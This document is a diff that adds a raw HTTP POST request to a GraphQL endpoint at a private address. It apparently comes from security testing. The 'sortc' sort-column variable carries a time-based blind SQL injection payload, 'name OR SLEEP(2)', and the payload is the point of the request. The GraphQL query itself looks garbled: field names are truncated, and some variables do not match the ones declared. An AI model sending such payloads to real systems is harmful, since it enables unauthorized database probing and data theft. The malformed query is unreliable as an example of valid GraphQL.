@@ -1,0 +1,44 @@
+POST / HTTP/1.1
+Host: 10.20.186.207:1111
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+Content-Type: application/json
+Content-Length: 564
+
+{"operationName":"pages","variables":{"offset":0,"limit":10,"sortc":"name OR SLEEP(2)","sortrev":false},"query":"query pages($offset: Int!, $limit: Int!, $sortc: String, $sortrev: Boolean) {
+  pages(offset: $offset, limit: $limit, sortc: $sortColumn, sortReverse: $sortReverse) {
+    id
+    n
+    __typen
+  }
+  me {
+    firstN
+    lastN
+    usern
+    __typen
+  }
+  components {
+    title
+    __typen
+  }
+  templates {
+    title
+    __typen
+  }
+  fonts {
+    n
+    __typen
+  }
+  partners {
+    id
+    n
+    banners {
+      n
+      __typen
+    }
+    __typen
+  }
+}
+"}
